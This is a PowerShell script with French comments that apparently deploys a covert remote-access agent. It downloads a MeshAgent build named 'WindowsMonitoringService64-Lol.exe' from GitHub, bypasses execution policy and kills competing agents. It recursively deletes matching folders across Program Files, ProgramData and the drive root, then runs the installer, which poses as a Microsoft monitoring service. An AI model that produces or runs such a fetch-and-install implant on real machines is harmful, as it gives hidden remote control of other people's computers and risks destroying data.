<#
force-update-agent.ps1
But : télécharger un exécutable depuis GitHub, arrêter et supprimer proprement les anciennes installations
      (noms et chemins communs : MeshAgent, Mesh Agent, LGTW*, WindowsMonitoringService...), puis installer la nouvelle
Usage : powershell -NoProfile -ExecutionPolicy Bypass -File "force-update-agent.ps1"
Remarques : Exécuter avec privilèges administrateur.
#>

#region Configuration
$TempBase = "$env:USERPROFILE\Downloads\NoWin"
$LogFile  = Join-Path $TempBase "force-update-agent.log"
# Construire l'URL de téléchargement : adaptez le tag et le nom de fichier si nécessaire
$Owner   = "LightZirconite"
$Repo    = "MeshAgent"
$Tag     = "exe"   # vérifier l'existence du tag sur GitHub
$Asset   = "WindowsMonitoringService64-Lol.exe"
$ReleaseUrl = "https://github.com/$Owner/$Repo/releases/download/$Tag/$Asset"
$LocalInstaller = Join-Path $TempBase $Asset
$InstallArgs = "--fullinstall"
# Noms d'exécutables / motifs à rechercher pour arrêt/suppression
$ExeNamePatterns = @("meshagent","MeshAgent","WindowsMonitoringService","LGTW","LGTWAgent","WindowsMonitoringService64")
$ServiceNamePatterns = @("mesh*","WindowsMonitoringService*","LGTW*")
#endregion

function Log {
    param([string]$Text)
    $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $line = "$ts`t$Text"
    Add-Content -Path $LogFile -Value $line -Force
    Write-Output $line
}

# Préparer le dossier temporaire et log
New-Item -ItemType Directory -Path $TempBase -Force | Out-Null
if (-not (Test-Path $LogFile)) { New-Item -Path $LogFile -ItemType File | Out-Null }
Log "Démarrage du script. Temp: $TempBase"

# Télécharger l'installateur
try {
    Log "Téléchargement depuis : $ReleaseUrl"
    Invoke-WebRequest -Uri $ReleaseUrl -OutFile $LocalInstaller -UseBasicParsing -ErrorAction Stop
    $filesize = (Get-Item $LocalInstaller).Length
    if ($filesize -le 1024) {
        throw "Fichier téléchargé trop petit ($filesize bytes). Abandon."
    }
    Log "Téléchargement OK ($filesize bytes) -> $LocalInstaller"
} catch {
    Log "ERREUR téléchargement : $_"
    throw "Echec téléchargement : $_"  # stoppe l'exécution
}

# Fonction utilitaire : récupérer processus correspondant aux motifs via Win32_Process.ExecutablePath
function Get-ProcessesByPathPattern {
    param([string[]]$patterns)
    $procs = @()
    try {
        $all = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
        foreach ($p in $all) {
            if (-not $p.ExecutablePath) { continue }
            foreach ($pat in $patterns) {
                if ($p.ExecutablePath -like "*$pat*") {
                    $procs += New-Object psobject -Property @{
                        ProcessId = $p.ProcessId
                        ExecutablePath = $p.ExecutablePath
                        Name = $p.Name
                    }
                }
            }
        }
    } catch {
        Log "Warning: impossible d'interroger Win32_Process : $_"
    }
    return $procs | Sort-Object -Unique -Property ProcessId
}

# 1) Trouver et arrêter services correspondants (préserver si arrêt impossible)
Log "Recherche de services correspondant aux motifs : $($ServiceNamePatterns -join ',')"
foreach ($svcPattern in $ServiceNamePatterns) {
    try {
        $svcs = Get-Service -Name $svcPattern -ErrorAction SilentlyContinue
        foreach ($s in $svcs) {
            try {
                if ($s.Status -ne 'Stopped') {
                    Log "Arrêt du service $($s.Name)"
                    Stop-Service -Name $s.Name -Force -ErrorAction Stop
                    Log "Service $($s.Name) arrêté"
                } else {
                    Log "Service $($s.Name) déjà arrêté"
                }
            } catch {
                Log "Impossible d'arrêter le service $($s.Name) : $_"
            }
        }
    } catch {
        Log "Get-Service pattern '$svcPattern' erreur: $_"
    }
}

# 2) Trouver et tuer processus par motifs
$procs = Get-ProcessesByPathPattern -patterns $ExeNamePatterns
if ($procs.Count -gt 0) {
    Log "Processus détectés à tuer : $($procs | ForEach-Object { "$($_.Name)[$($_.ProcessId)]" } -join ', ')"
    foreach ($p in $procs) {
        try {
            Log "Tentative Stop-Process Id=$($p.ProcessId) Name=$($p.Name)"
            Stop-Process -Id $p.ProcessId -Force -ErrorAction Stop
            Log "Processus $($p.ProcessId) tué"
        } catch {
            Log "Erreur kill process $($p.ProcessId) : $_"
        }
    }
} else {
    Log "Aucun processus ciblé trouvé via Win32_Process"
}

# 3) Rechercher dossiers d'installation connus et les supprimer proprement
# Emplacements prioritaires
$SearchRoots = @($env:ProgramFiles, $env:ProgramFiles(x86), "$env:ProgramData", "$env:SystemDrive\")
$FolderNamePatterns = @("Mesh Agent","MeshAgent","LGTW*","WindowsMonitoringService","Microsoft Corporation\WindowsMonitoringService")

$FoundPaths = @()
foreach ($root in $SearchRoots | Where-Object { $_ -ne $null -and (Test-Path $_) }) {
    foreach ($pat in $FolderNamePatterns) {
        try {
            # Recherche limitée à profondeur raisonnable : utiliser -Recurse mais limiter exceptions
            $matches = Get-ChildItem -Path $root -Directory -Recurse -ErrorAction SilentlyContinue |
                       Where-Object { $_.FullName -like "*$pat*" }
            foreach ($m in $matches) { $FoundPaths += $m.FullName }
        } catch {
            # ignorer erreurs d'accès sur certaines branches
            Log "Warning recherche sous $root pattern $pat : $_"
        }
    }
}

$FoundPaths = $FoundPaths | Sort-Object -Unique
if ($FoundPaths.Count -gt 0) {
    Log "Dossiers d'installation détectés pour suppression :"
    $FoundPaths | ForEach-Object { Log "  $_" }
    foreach ($p in $FoundPaths) {
        try {
            # double-check aucun processus n'utilise des fichiers de ce dossier
            Log "Suppression de $p"
            Remove-Item -Path $p -Recurse -Force -ErrorAction Stop
            Log "Suppression OK : $p"
        } catch {
            Log "Erreur suppression $p : $_"
        }
    }
} else {
    Log "Aucun dossier d'installation détecté par motifs."
}

# 4) Exécuter l'installateur téléchargé avec --fullinstall (sous élévation si nécessaire)
try {
    Log "Lancement de l'installateur : $LocalInstaller $InstallArgs"
    $proc = Start-Process -FilePath $LocalInstaller -ArgumentList $InstallArgs -Wait -PassThru -ErrorAction Stop
    Log "Installateur terminé avec code de sortie : $($proc.ExitCode)"
} catch {
    Log "Erreur exécution installateur : $_"
    throw "Échec de l'exécution de l'installateur : $_"
}

# 5) Vérifier installation sommaire : recherche d'un exécutable/service installé
$InstallDetected = $false
try {
    # Essayer de trouver un nouveau processus ou un service installé avec les mêmes motifs
    Start-Sleep -Seconds 3
    $postProcs = Get-ProcessesByPathPattern -patterns $ExeNamePatterns
    if ($postProcs.Count -gt 0) { $InstallDetected = $true }
    # ou chercher dossier cible classique
    foreach ($root in @($env:ProgramFiles, "$env:ProgramFiles\Microsoft Corporation")) {
        if (Test-Path $root) {
            $found = Get-ChildItem -Path $root -Recurse -Directory -ErrorAction SilentlyContinue | Where-Object { $_.FullName -match "WindowsMonitoringService|MeshAgent|LGTW" }
            if ($found) { $InstallDetected = $true; break }
        }
    }
} catch {
    Log "Erreur vérification post-install : $_"
}

if ($InstallDetected) {
    Log "Installation détectée avec succès après exécution."
} else {
    Log "Aucune installation détectée après exécution. Vérifier manuellement."
}

# 6) Nettoyage : supprimer l'installateur téléchargé si tout s'est bien passé
try {
    if (Test-Path $LocalInstaller) {
        # supprimer seulement si installation détectée
        if ($InstallDetected) {
            Remove-Item -Path $LocalInstaller -Force -ErrorAction Stop
            Log "Installateur temporaire supprimé : $LocalInstaller"
        } else {
            Log "Conserve l'installateur ($LocalInstaller) pour diagnostic (installation non confirmée)."
        }
    }
} catch {
    Log "Erreur nettoyage installateur : $_"
}

Log "Fin du script."
